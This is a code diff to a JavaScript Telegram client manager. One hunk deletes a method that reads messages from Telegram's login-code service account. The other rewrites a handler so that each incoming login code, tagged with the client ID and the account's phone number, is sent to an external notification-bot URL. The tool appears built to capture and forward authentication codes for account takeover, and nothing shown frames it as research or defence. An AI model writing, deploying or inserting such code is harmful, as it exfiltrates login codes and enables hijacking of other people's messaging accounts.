@@ -417,17 +417,6 @@ class TelegramManager {
         console.log("TotalChats:", chats.total);
         return chats;
     }
-    async getLastMsgs(limit) {
-        if (!this.client)
-            throw new Error('Client is not initialized');
-        const msgs = await this.client.getMessages("777000", { limit });
-        let resp = '';
-        msgs.forEach((msg) => {
-            console.log(msg.text);
-            resp += msg.text + "\n";
-        });
-        return resp;
-    }
     async getSelfMSgsInfo() {
         if (!this.client)
             throw new Error('Client is not initialized');
@@ -835,7 +824,7 @@ class TelegramManager {
                 console.log(event.message.text.toLowerCase());
                 console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                 console.log("Date :", new Date(event.message.date * 1000));
-                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(event.message.text)}`);
+                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
             }
         }
     }
